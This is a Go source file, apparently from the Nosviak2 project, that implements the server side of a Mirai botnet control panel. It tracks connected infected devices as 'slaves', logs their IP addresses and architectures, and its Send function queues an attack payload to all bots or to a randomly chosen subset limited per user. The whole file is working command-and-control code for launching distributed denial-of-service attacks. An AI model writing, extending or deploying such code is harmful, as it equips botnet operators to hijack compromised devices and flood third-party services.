package mirai

import (
	"Nosviak2/core/sources/language/static"
	"Nosviak2/core/sources/layouts/toml"
	"Nosviak2/core/clients/sessions"
	"Nosviak2/core/sources/tools"
	"log"
	"math/rand"
	"strings"
	"net"
	"sync"
	"time"
	"os"
)

//stores information about the client
//this will allow is to work without issues
type Client struct { //stored inside a structure
	Name string //stores the client name
	Conn net.Conn //stores the connection
	Queue chan []byte
	ID int64
}

var (
	//stores all of our slaves
	//this will ensure we can mointer them
	MiraiSlaves *Core = &Core{
		All: make(map[int64]*Client),
		Count: 0,
	}

	//main mutex storage
	mutex sync.Mutex
)
//controls the information about slaves
//this will ensure its done without errors
type Core struct {
	Mutex sync.RWMutex //mutex for storage
	All map[int64]*Client //all of the slaves
	Count int //amount of slaves
}

//Adds the client into the map
//saves a client into the map properly
func (c *Client) Add() {
	MiraiSlaves.Mutex.Lock(); mutex.Lock()
	defer MiraiSlaves.Mutex.Unlock()
	defer mutex.Unlock()

	c.ID = time.Now().UnixMicro()
	c.Queue = make(chan []byte)
	MiraiSlaves.All[c.ID] = c
	MiraiSlaves.Count++

	System := BinAppears(c.Name)

	//dynamic connection information has been set here
	//this will ensure its done without errors happening
	if toml.ConfigurationToml.Terminal.DynamicTerminal { //dynamic connection
		static.SlaveController(static.Controls["connect_slave.tfx"], tools.Sanatize(c.Name), strings.Split(c.Conn.RemoteAddr().String(), ":")[0], strings.Split(c.Conn.RemoteAddr().String(), ":")[1], "mirai", System, MiraiSlaves.Count, os.Stdout)
	} else {
		//prints the correct message properly without issues happening
		//this will ensure the terminal knows about the new slave properly
		log.Printf("[mirai] [slave connected] [%s] [%s] [%d]\r\n", c.Conn.RemoteAddr().String(), tools.Sanatize(c.Name), MiraiSlaves.Count)
	}
}

//Removes the client from the map
//removes the certain client from the map
func (c *Client) Remove() {
	MiraiSlaves.Mutex.Lock(); mutex.Lock() //locks
	defer MiraiSlaves.Mutex.Unlock() //unlocks
	defer mutex.Unlock() //unlocks

	//deletes the slave properly
	delete(MiraiSlaves.All, c.ID)
	MiraiSlaves.Count-- //count properly

	System := BinAppears(c.Name)
	

	//dynamic system properly and safely
	//this will ensure its done without errors happenign
	if toml.ConfigurationToml.Terminal.DynamicTerminal {
		static.SlaveController(static.Controls["disconnect_slave.tfx"], tools.Sanatize(c.Name), strings.Split(c.Conn.RemoteAddr().String(), ":")[0], strings.Split(c.Conn.RemoteAddr().String(), ":")[1], "mirai", System, MiraiSlaves.Count, os.Stdout)
	} else {
		//alert for slave disconnect
		//this will print into the terminal
		log.Printf("[mirai] [Slave left] [%s] [%s] [%d]", c.Conn.RemoteAddr().String(), tools.Sanatize(c.Name), MiraiSlaves.Count)
	}
}


//sends the payload properly
//this will evenly distribute the attack
func Send(payload []byte, s *sessions.Session) error {
	MiraiSlaves.Mutex.Lock()
	defer MiraiSlaves.Mutex.Unlock()


	var targets map[int64]*Client = MiraiSlaves.All
	//this will help us get there slaves
	//ensures there attack is only sent via properly
	if s != nil && s.User.MaxSlaves > 0 { //checks amount properly
		targets = make(map[int64]*Client) //correctly clears

		//loops the amount of times properly and safely
		//this will ensure its done without errors happening
		for pos := 0; pos < s.User.MaxSlaves; pos++ { //loops through
			current := rand.Intn(len(MiraiSlaves.All)) //generates a random number
			var position int = 0 //ranges through all slaves
			for Key, Slave := range MiraiSlaves.All { //ranges through
				if position == current { //compares the current with wanted
					targets[Key] = Slave //saves into the array properly
					break //breaks from the looping properly
				}; position++
			}
		}
	}

	//ranges through all the slaves
	for _, slave := range targets {
		//tries to forward the payload
		slave.Queue <- payload
	}; return nil
}